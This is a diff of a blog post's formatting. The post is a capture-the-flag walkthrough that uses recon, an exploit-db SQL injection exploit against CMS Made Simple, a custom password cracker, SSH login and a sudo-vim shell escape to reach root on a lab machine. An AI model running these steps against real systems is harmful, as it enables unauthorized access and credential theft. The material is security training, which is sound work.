@@ -26,8 +26,7 @@ Wanted to pop an easy one just to get the rush.
 
 Let's give it an nmap scan to find the ports.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.64.46
 [sudo] password for kali: 
@@ -64,16 +63,13 @@ PORT     STATE SERVICE VERSION
 |_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Check the robots.txt file.  Check to see if there is anything interesting.
 
-{% raw %}
-```html
-http://10.10.4.247/robots.txt
-
+{% capture robotstxt %}
 #
 # "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
 #
@@ -106,14 +102,13 @@ Disallow: /openemr-5_0_1_3
 #
 # End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
 #
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='http://10.10.4.247/robots.txt' content=robotstxt %}
 
 <br />
 FFUF the webserver to try and find directories and web servers.
 
-{% raw %}
-```bash
+{% capture ffuf %}
 ┌──(kali㉿kali)-[~/Documents/thm/simple]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.4.247/FUZZ -e .txt,.bak,.html -fw 3503
 
@@ -142,8 +137,8 @@ ________________________________________________
 .html                   [Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 278ms]
 robots.txt              [Status: 200, Size: 929, Words: 176, Lines: 33, Duration: 267ms]
 simple                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 262ms]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf %}
 
 <br />
 Check the /simple directory that is running on the webserver.
@@ -166,8 +161,7 @@ Research CMS Made Simple, version 2.2.8, to see if there are any available vulne
 <br />
 Download the exploit from exploit-db.
 
-{% raw %}
-```bash
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/thm/simple]
 └─$ wget https://www.exploit-db.com/raw/46635 -O exploit.py  
 --2025-03-02 15:38:28--  https://www.exploit-db.com/raw/46635
@@ -180,14 +174,13 @@ Saving to: ‘exploit.py’
 exploit.py                                                 100%[========================================================================================================================================>]   6.30K  --.-KB/s    in 0s      
 
 2025-03-02 15:38:29 (97.8 MB/s) - ‘exploit.py’ saved [6456/6456]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploit %}
 
 <br />
 Update the code to remove the termcolor from the code so I don't have to install it.
 
-{% raw %}
-```python
+{% capture updateexploit %}
 #!/usr/bin/env python
 # Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
 # Date: 30-03-2019
@@ -222,38 +215,35 @@ if options.cracking:
     crack_password()
 
 beautify_print()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='exploit.py' content=updateexploit %}
 
 <br />
 Run the exploit and redirect the output to a file so it is easier to read.
 
-{% raw %}
-```bash
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/thm/simple]
 └─$ python2 exploit.py -u http://10.10.4.247/simple > output.txt
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 View the results from the file.
 
-{% raw %}
-```bash
+{% capture viewresults %}
 <snip>
 
 [+] Salt for password found: 1dac0d92e9fa6bb2
 [+] Username found: mitch
 [+] Email found: admin@admin.com
 [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=viewresults %}
 
 <br />
 I was having issues with the password cracker in the original exploit so I wrote my own using the original as a guide.
 
-{% raw %}
-```python
+{% capture writepasswordcracker %}
 import hashlib
 
 salt = '1dac0d92e9fa6bb2'
@@ -267,25 +257,23 @@ with open('/usr/share/wordlists/rockyou.txt','r') as fs:
             break
 
 print('Fin')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='cracker_0x00.py' content=writepasswordcracker %}
 
 <br />
 Run it to crack the password.
 
-{% raw %}
-```python
+{% capture runcracker %}
 ========== RESTART: /home/kali/Documents/thm/simple/thm-crack_0x00.py ==========
 [*] Password cracked: secret
 Fin
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runcracker %}
 
 <br />
 SSH with the credentials from the script.
 
-{% raw %}
-```bash
+{% capture sshmitch %}
 ┌──(kali㉿kali)-[~/Documents/thm/simple]
 └─$ ssh mitch@10.10.4.247 -p 2222
 The authenticity of host '[10.10.4.247]:2222 ([10.10.4.247]:2222)' can't be established.
@@ -305,28 +293,26 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
 
 Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
 $
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshmitch %}
 
 <br />
 Check the home directory to see the users with a home directory.
 
-{% raw %}
-```bash
+{% capture lshome %}
 $ ls -la /home
 total 16
 drwxr-xr-x  4 root    root    4096 aug 17  2019 .
 drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
 drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
 drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=lshome %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 $ cat user.txt  
 <redacted>
 $ ip a
@@ -342,34 +328,31 @@ $ ip a
        valid_lft forever preferred_lft forever
     inet6 fe80::f7:43ff:feb2:3655/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Run sudo -l to see the commands that the user can run as sudo.
 
-{% raw %}
-```bash
+{% capture sudol %}
 $ sudo -l
 User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Run sudo vim to enter into vim.
 
-{% raw %}
-```bash
+{% capture sudovim %}
 $ sudo /usr/bin/vim
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudovim %}
 
 <br />
 Use vim to drop into a shell.
 
-{% raw %}
-```bash
+{% capture gtfovim %}
 <snip>
 
 ~                                                                                                            VIM - Vi IMproved                                                                                                              
@@ -389,14 +372,13 @@ Use vim to drop into a shell.
 <snip>
 
 :!sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=gtfovim %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 # cat /root/root.txt
 <redacted>
 # ip a
@@ -412,8 +394,8 @@ Get the root.txt flag.
        valid_lft forever preferred_lft forever
     inet6 fe80::f7:43ff:feb2:3655/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And with that we wrapped this one up.  See you next time!
